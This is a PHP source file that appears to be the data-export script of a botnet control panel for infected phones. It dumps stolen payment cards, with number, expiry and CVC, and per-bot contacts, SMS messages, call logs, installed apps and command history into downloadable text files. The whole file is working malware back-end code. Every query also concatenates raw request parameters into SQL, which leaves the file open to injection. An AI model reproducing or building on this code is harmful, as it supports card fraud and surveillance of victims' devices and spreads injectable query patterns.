<?php
	include "config.php";

	header('Content-Type: application/octet-stream');
	header("Content-Transfer-Encoding: Binary"); 
	header("Content-disposition: attachment; filename=\"".time().".txt\"");
	
	$bid = $_GET['id'];
	
	$html = "";
	
	function get_contact_name_from_id($id){
		global $dbm;
		$sql = "select * from contacts where id='".$id."'";
		$resgetcontact = $dbm->query($sql);
		if($dbm->count>0){
			while($rowc=mysqli_fetch_array($resgetcontact)) {
				return array($rowc[2],$rowc[3]);
			}
		}else{
			return array();
		}
	}
	
	if(strlen($bid)>0){
		$res = $dbm->query("select * from bots where bid='".$bid."'");
		if($dbm->count>0){
			if($_GET['op']==""){
				while($row=mysqli_fetch_array($res)) {
					foreach ($row as $key => $value) {
						if(!is_numeric($key)){
							$html .= "$key : $value\r\n";
						}
					}
				}
			}
		}
		$html .= "\r\n\r\n";
	}
	
	if($_GET['query']=="commands"){
		$res = $dbm->query("select * from commands where bid='".$bid."' ORDER BY id DESC");
		if($dbm->count>0){
			$count = 0;
			while($rowc=mysqli_fetch_array($res)) {
				$html .= new_time($rowc[4])." - ".$rowc[2]."\r\n";
			}
		}else{
			$html .= "none";
		}
	}
	
	if($_GET['query']=="allcards"){
		$res = $dbm->query("select * from cards ORDER BY id DESC");
		if($dbm->count>0){
			$count = 0;
			while($row=mysqli_fetch_array($res)) {
				$card = json_decode($row[2]);
				$c = $card->card.":".$card->month.":".$card->year.":".$card->cvc;
				$html .= $c."\r\n";
			}
		}else{
			$html .= "none";
		}
	}
	
	if($_GET['query']=="cards"){
		$res = $dbm->query("select * from cards where bot_id='".$bid."' ORDER BY id DESC LIMIT 10");
		if($dbm->count>0){
			$count = 0;
			while($row=mysqli_fetch_array($res)) {
				$card = json_decode($row[2]);
				$c = $card->card.":".$card->month.":".$card->year.":".$card->cvc;
				$html .= $c."\r\n";
			}
		}else{
			$html .= "none";
		}
	}
	
	if($_GET['query']=="contacts"){
		$res = $dbm->query("select * from contacts where bot_id='".$bid."' ORDER BY id DESC");
		if($dbm->count>0){
			$count = 0;
			while($rowc=mysqli_fetch_array($res)) {
				$html .= $rowc[2]." - ".$rowc[3]."\r\n";
			}
		}else{
			$html .= "none";
		}
	}
	
	if($_GET['query']=="allcontacts"){
		$res = $dbm->query("select * from contacts ORDER BY id DESC");
		if($dbm->count>0){
			$count = 0;
			while($rowc=mysqli_fetch_array($res)) {
				$html .= $rowc[2]." - ".$rowc[3]."\r\n";
			}
		}else{
			$html .= "none";
		}
	}
	
	if($_GET['query']=="allsmss"){
		$ressms = $dbm->query("select * from sms where bot_id='".$bid."' ORDER BY sms_time DESC");
		if($dbm->count>0){
			$count = 0;
			while($rowsms=mysqli_fetch_array($ressms)) {
				$idc = "";
				$cid = 0;
				if($rowsms[2]>0 && $rowsms[3]==0){
					$idc = "me <- ";
					$cid = $rowsms[2];
				}
				if($rowsms[3]>0 && $rowsms[2]==0){
					$idc = "me -> ";
					$cid = $rowsms[3];
				}
				$contact = get_contact_name_from_id($cid);
	
				$html .= "\r\n".$idc ." ".$contact[0]."(".$contact[1].") ";
				$html .= "".new_time(round($rowsms[5]/1000))." :<\r\n ".mb_strimwidth($rowsms[4],0,20,"...")."\r\n\r\n";
			}
		}else{
			$html .= "none<br>";
		}
	}
	
	if($_GET['query']=="apps"){
		$res = $dbm->query("select * from commands where idcom='3' and bid='".$bid."' ORDER BY id DESC LIMIT 1");
		if($dbm->count>0){
			$count = 0;
			while($row=mysqli_fetch_array($res)) {
				$aapp = json_decode($row[7]);
				for($i=0;$i<count($aapp);$i++){
					$html .= "".$aapp[$i]->name . "\r\n".$aapp[$i]->activity."\r\n";
					$count++;
				}
			}
		}else{
			$html .= "none";
		}
	}
	
	if($_GET['query']=="calls"){
			$res = $dbm->query("select * from calls where bot_id='".$bid."' ORDER BY id DESC");
			if($dbm->count>0){
				$count = 0;
				while($row=mysqli_fetch_array($res)) {
					$sql = "select * from contacts where id='".$row[2]."'";
					$resc = $dbm->query($sql);
					while($rowc=mysqli_fetch_array($resc)) {
						$name = $rowc[2];
						$number = $rowc[3];
					}
					$html .= $name."(".$number.") - ".new_time(round($row[4]/1000))."\r\n";
				}
			}else{
				$html .= "none";
			}
		}
	
	if($_GET['query']=="historyapps"){
		$res = $dbm->query("select * from apps_logs where bid='".$bid."' ORDER BY id DESC");
		if($dbm->count>0){
			$count = 0;
			while($row=mysqli_fetch_array($res)) {
				//$row[7] = str_replace("\"name\"","name",$row[7]);
				//$row[7] = str_replace("\"dir\"","dir",$row[7]);
				//$row[7] = str_replace("\"activity\"","activity",$row[7]);
				//print_r($row[7]);
				//$aapp = json_encode($row[7]);
				//$contacts = json_decode($row[7]);
				//var_dump($aapp);
				
				//for($i=0;$i<count($contacts);$i++){
					//var_dump( $aapp[$i]);
				
				$html .= $row[2]." - ".new_time($row[4])."\r\n";
				//	$count++;
				//	if($count==10)break;
				//}
			
				//echo json_last_error_msg();
				//print_r($aaps);
				//$html .= $row[7];
			}
		}else{
			$html .= "none";
		}
	}
	
	
	
	echo $html;
?>
